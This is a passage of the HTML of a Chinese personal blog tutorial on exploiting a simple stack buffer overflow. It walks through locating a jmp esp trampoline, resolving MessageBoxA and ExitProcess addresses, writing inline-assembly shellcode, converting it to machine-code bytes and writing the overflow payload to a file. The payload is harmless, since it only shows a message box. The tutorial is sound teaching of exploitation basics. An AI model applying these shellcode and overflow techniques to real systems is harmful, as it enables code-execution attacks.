(int)ptr + position; </span><br><span class="line">			printf(&quot;END OF 0x%x\n&quot;, address); </span><br><span class="line">			done_flag &#x3D; true; </span><br><span class="line">		&#125; </span><br><span class="line">	&#125;</span><br><span class="line">	getchar();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjkxNzA2NDcucG5n?x-oss-process=image/format,png" alt="image-20200629170646985"></p>
<h3 id="获取-MessageBoxA函数"><a href="#获取-MessageBoxA函数" class="headerlink" title="获取 MessageBoxA函数"></a>获取 MessageBoxA函数</h3><p>利用下面的程序获取 MessageBoxA的调用地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HINSTANCE LibHandle;</span><br><span class="line">	MYPROC ProcAdd;</span><br><span class="line">	LibHandle = LoadLibrary(<span class="string">"user32"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"user32=0x%x\n"</span>,LibHandle);</span><br><span class="line"></span><br><span class="line">	ProcAdd=(MYPROC)GetProcAddress(LibHandle,<span class="string">"MessageBoxA"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"messagesbox=0x%x\n"</span>,ProcAdd);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMzIzMTQucG5n?x-oss-process=image/format,png" alt="image-20200628232314406"></p>
<h3 id="同理找到-ExitProcess"><a href="#同理找到-ExitProcess" class="headerlink" title="同理找到 ExitProcess"></a>同理找到 ExitProcess</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjgyMzM1MzIucG5n?x-oss-process=image/format,png" alt="image-20200628233532091"></p>
<h3 id="获取到的全部-api的函数地址："><a href="#获取到的全部-api的函数地址：" class="headerlink" title="获取到的全部 api的函数地址："></a>获取到的全部 api的函数地址：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jmp esp &#x3D; 0x77e35b79</span><br><span class="line">user32&#x3D;0x77d10000</span><br><span class="line">messasbox&#x3D;0x77d507ea</span><br><span class="line">ExitProcess&#x3D;0x7c81cb12</span><br></pre></td></tr></table></figure>

<h3 id="编写汇编代码"><a href="#编写汇编代码" class="headerlink" title="编写汇编代码"></a>编写汇编代码</h3><p>使用C语言的 _ASM{} 可以直接编写汇编的代码</p>
<p>下面是弹窗的汇编代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include&quot;stdafx.h&quot;</span><br><span class="line">#include &lt;windows.h&gt; </span><br><span class="line">int main() </span><br><span class="line">&#123; </span><br><span class="line">	_asm&#123; </span><br><span class="line">		sub sp,0x440</span><br><span class="line">		xor ebx,ebx</span><br><span class="line">		push ebx &#x2F;&#x2F; cut string</span><br><span class="line">		push 0x6F657A20  &#x2F;&#x2F;zeo的ascll码</span><br><span class="line">		push 0x6D612069</span><br><span class="line">		mov eax,esp &#x2F;&#x2F;load address of failwest</span><br><span class="line">		push ebx</span><br><span class="line">		push eax</span><br><span class="line">		push eax</span><br><span class="line">		push ebx</span><br><span class="line">		mov eax,0x77D507EA &#x2F;&#x2F; 系统获取的messageboxa的地址</span><br><span class="line">		call eax &#x2F;&#x2F;call MessageboxA</span><br><span class="line">		push ebx</span><br><span class="line">		mov eax,0x7C81CB12     &#x2F;&#x2F;系统获取的exitprocess的地址</span><br><span class="line">		call eax &#x2F;&#x2F;call exit(0)</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用vc6的反汇编功能，找出代码的机器码</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxNzU4MjgucG5n?x-oss-process=image/format,png" alt="image-20200630175828608"></p>
<p>转化后的机器码和解释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">33 DB                xor         ebx,ebx                    </span><br><span class="line">53                   push        ebx                        </span><br><span class="line">68 20 7A 65 6F       push        6F657A20h                  </span><br><span class="line">68 69 20 61 6D       push        6D612069h                  </span><br><span class="line">8B C4                mov         eax,esp                    </span><br><span class="line">53                   push        ebx              MessageBoxA函数额 4 个参数按照从右向左的顺序入            </span><br><span class="line">50                   push        eax                        </span><br><span class="line">50                   push        eax                        </span><br><span class="line">53                   push        ebx                        </span><br><span class="line">B8 EA 07 D5 77       mov         eax,77D507EAh    调用 MessageBoxA，不同的机器这里的函数入口地址可能不同，按实际值填入         </span><br><span class="line">FF D0                call        eax                        </span><br><span class="line">53                   push        ebx                        </span><br><span class="line">B8 12 CB 81 7C       mov         eax,7C81CB12h    调用 exit(0)。           </span><br><span class="line">FF D0                call        eax</span><br></pre></td></tr></table></figure>

<h3 id="写入文件完整的payload"><a href="#写入文件完整的payload" class="headerlink" title="写入文件完整的payload"></a>写入文件完整的payload</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxODE5MDEucG5n?x-oss-process=image/format,png" alt="image-20200630181901702"></p>
<h3 id="运行一下，成功！"><a href="#运行一下，成功！" class="headerlink" title="运行一下，成功！"></a>运行一下，成功！</h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxODMzMzQucG5n?x-oss-process=image/format,png" alt="image-20200630183334713"></p>
<h2 id="0x05-shellcode踩坑"><a href="#0x05-shellcode踩坑" class="headerlink" title="0x05 shellcode踩坑"></a>0x05 shellcode踩坑</h2><p>1、全部地址淹没后，就要把esp淹没，esp可以随便写</p>
<p>2、本次使用的是 jmp esp = 0x77e35b79 ，找到后但是编写shellcode的时候，因为是小端序</p>
<p>​ 所以填写的时候是反向的</p>
<p>​ 所以填写的时候是反向的</p>
<p>​ 所以填写的时候是反向的</p>
<p>本来是 0x77e35b79 ，那么写入的时候就是 79 5b e3 77 例如</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxODIyMzQucG5n?x-oss-process=image/format,png" alt="image-20200630182234282"></p>
<p>3、虽然说是jmp esp指令需要注意 小端序，但是后面转化过的shellcode 就不需要了，因为已经转化过了，不用多此一举，已转化过了</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MzAxODMyMDcucG5n?x-oss-process=image/format,png" alt="image-20200630183207368"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/categories">分类</a></li>
         
          <li><a href="/projects_url">项目</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-简介"><span class="toc-number">1.</span> <span class="toc-text">0x00 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-原理"><span class="toc-number">2.</span> <span class="toc-text">0x01 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-先找main函数"><span class="toc-number">3.</span> <span class="toc-text">0x02 先找main函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#第一种，通过od的字符串查找或者经验吧，找特征自己找到主函数"><span class="toc-number">3.1.</span> <span class="toc-text">第一种，通过od的字符串查找或者经验吧，找特征自己找到主函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第二种：利用ida分析"><span class="toc-number">3.2.</span> <span class="toc-text">第二种：利用ida分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-正常运行一下程序"><span class="toc-number">4.</span> <span class="toc-text">0x03 正常运行一下程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-简单的破解"><span class="toc-number">5.</span> <span class="toc-text">0x04 简单的破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-shellcode编写"><span class="toc-number">6.</span> <span class="toc-text">0x04 shellcode编写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#选用-jmp-esp-作为定位-shellcode-的跳板"><span class="toc-number">6.1.</span> <span class="toc-text">选用 jmp esp 作为定位 shellcode 的跳板</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取jmp-esp的地址"><span class="toc-number">6.2.</span> <span class="toc-text">获取jmp esp的地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取-MessageBoxA函数"><span class="toc-number">6.3.</span> <span class="toc-text">获取 MessageBoxA函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#同理找到-ExitProcess"><span class="toc-number">6.4.</span> <span class="toc-text">同理找到 ExitProcess</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取到的全部-api的函数地址："><span class="toc-number">6.5.</span> <span class="toc-text">获取到的全部 api的函数地址：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#编写汇编代码"><span class="toc-number">6.6.</span> <span class="toc-text">编写汇编代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#写入文件完整的payload"><span class="toc-number">6.7.</span> <span class="toc-text">写入文件完整的payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#运行一下，成功！"><span class="toc-number">6.8.</span> <span class="toc-text">运行一下，成功！</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-shellcode踩坑"><span class="toc-number">7.</span> <span class="toc-text">0x05 shellcode踩坑</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/&text=二进制漏洞：从简单栈溢出到写自己编写shellcode" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/&title=二进制漏洞：从简单栈溢出到写自己编写shellcode" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/&is_video=false&description=二进制漏洞：从简单栈溢出到写自己编写shellcode" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=二进制漏洞：从简单栈溢出到写自己编写shellcode&body=Check out this article: https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/&title=二进制漏洞：从简单栈溢出到写自己编写shellcode" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/&title=二进制漏洞：从简单栈溢出到写自己编写shellcode" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/&title=二进制漏洞：从简单栈溢出到写自己编写shellcode" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/&title=二进制漏洞：从简单栈溢出到写自己编写shellcode" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/&name=二进制漏洞：从简单栈溢出到写自己编写shellcode&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://godzeo.github.io/2020/07/05/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%EF%BC%9A%E4%BB%8E%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%B0%E5%86%99%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99shellcode/&t=二进制漏洞：从简单栈溢出到写自己编写shellcode" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2022
    Zeo
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/categories">分类</a></li>
         
          <li><a href="/projects_url">项目</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
